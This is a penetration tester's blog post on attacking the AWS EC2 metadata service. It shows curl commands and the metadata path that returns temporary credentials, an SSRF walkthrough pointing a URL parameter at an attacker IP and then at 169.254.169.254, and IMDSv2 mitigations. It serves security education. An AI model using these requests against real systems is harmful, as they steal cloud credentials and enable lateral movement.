---
layout: single
date: 2022-07-01
classes: wide
header:
  teaser: /assets/images/aws_metadata/logo.png
  teaser_home_page: true
title: "Attacking the AWS Metadata Service"
excerpt: "
\"Since it first launched over 10 years ago, the [Amazon EC2](http://aws.amazon.com/ec2) Instance Metadata Service (IMDS) has helped customers build secure and scalable applications. The
IMDS solved a big security headache for cloud users by providing access to temporary, frequently rotated credentials, removing the need to hardcode or distribute sensitive credentials to
instances manually or programatically.
\"

However, as you may have noticed, the Metadata service possesses one unique characteristic that is useful to attackers. Along with providing information access to the given instance, it
also provides _credentials_.

Why does this matter?"
categories:
  - Tradecraft and Techniques
tags:
  - AWS
  - Cloud
  - SSRF
---
I originally developed this blog for the [Renegade Labs team](https://risk3sixty.com/penetration-testing/) at [risk3sixty](https://risk3sixty.com/), and have cross-posted it here for replication of my personal work.
{: .notice--warning}

| Mitre ATT&CK Technique | ID |
| --- | --- |
| [Unsecured Credentials: Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/) | T1552.005 |

<p align="center">
        <img src="/assets/images/aws_metadata/xmind_1.png" />
</p>

The AWS Metadata service facilitiates information access for applications running on a given EC2 instance. This is provided to aid configuration and management of tooling and is accessible only by the instance itself.

Per [Amazon](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/):

```
Since it first launched over 10 years ago, the [Amazon EC2](http://aws.amazon.com/ec2) Instance Metadata Service (IMDS) has helped customers build secure and scalable applications. The IMDS solved a big security headache for cloud users by providing access to temporary, frequently rotated credentials, removing the need to hardcode or distribute sensitive credentials to instances manually or programatically.
```

However, as you may have noticed, the Metadata service possesses one unique characteristic that is useful to attackers. Along with providing information access to the given instance, it also provides _credentials_. 

Why does this matter?

This effectively means that an attacker who compromised an AWS instance can query the Metadata service for credentials that can be then used for lateral movement to other cloud resources.

## Attack Breakdown
Let's say an attacker has compromised a host and acquired access using SSH. From a shell, the Metadata service can be accessed using:
`curl http://169.254.169.254`.
<p align="center">
        <img src="/assets/images/aws_metadata/curl_1.png" />
</p>

The Metadata service can then be more directly queried through the `/latest/meta-data` path on this URL.

<p align="center">
        <img src="/assets/images/aws_metadata/curl_2.png" />
</p>

The attacker can request a fresh pair of AWS access keys using the complete path of: 
`http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`

<p align="center">
        <img src="/assets/images/aws_metadata/curl_3.png" />
</p>

And just like that an attacker has a separate pair of credentials! These keys can be then used for lateral movement after an initial breach or persistence. 

## But Wait There's More
So while the first example is only limited to an attacker somehow acquiring a shell on a resource, it is actually not the most realistic attack scenario that exploits the Metadata service.

Instead, a web application exploitation method known as Server-Side Request Forgery (SSRF) is actually the most likely candidate to grant attackers the ability to target the metadata service.

The interesting thing about this attack chain is that it immediately shifts the threat model of an organization from their web application environment to their infrastructure. This breaks the common assumption that a web application vulnerability can only impact the application itself. In some cases this can be devastating for an organization should the appropriate variables be in place.

### SSRF
<p align="center">
        <img src="/assets/images/aws_metadata/xmind_2.png" />
</p>
To understand how this works, one must know what a SSRF vulnerability looks like. For example, consider a web application hosted on AWS that has the following URL:

```
https://mywebapp.com/images/remote?=http://imgur.com
```

This URL allows the application to load images from disparate locations that are used in the web application. However, an attacker notices this and changes the `remote` parameter to an IP address under their control.

```
https://mywebapp.com/images/remote?=http://1.2.3.4 <- malicious IP
```

Once the new URL is accessed, the attacker checks their server logs and notes a hit from the web application server. 
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
<web server IP> - - [03/Jul/2022 07:41:11] "GET / HTTP/1.1" 200 -
```

This is a SSRF vulnerability, as the attacker can induce the web application into making requests to unintended resources.

When chained against web applications that run on AWS, this kind of weakness can be catastrophic. Consider an attacker who takes advantage of the same URL by issuing this request:
```
https://mywebapp.com/images/remote?=http://169.254.169.254/
```

When this is issued, the web application tries to fetch the "image" and store it in the web application, but in reality fetches a fresh pair of AWS credentials that can be used by the attacker:

```
{
  "Code" : "Success",
  "LastUpdated" : "2022-07-03T11:53:44Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAVQ[...snip...]K62GIEE",
  "SecretAccessKey" : "wK8[...snip...]rX9mvFK",
  "Token" : "IQoJb[...snip...]1clp9UA==",
  "Expiration" : "2022-07-03T18:04:22Z"
}  
```

## Mitigation: IMDSv2
AWS has since released Instnace Metadata Service v2 (IMDSv2), which adds an addiitonal layer of protection on the metadata service by requesting session authentication.

This is achieved by requiring a `PUT` request to be used initially to gather a secret token. This token is then used like a password for performing additional actions with the metadata service, including still requesting credentials.

Therefore, IMDSv2 does not fix metadata service credential leakage entirely, but rather makes it more difficult to achieve through a generic SSRF vulnerability.

Alternatively, the metadata service can be completely disabled on EC2 instances, although this remediation path may have drawbacks should your assets utilize the service.
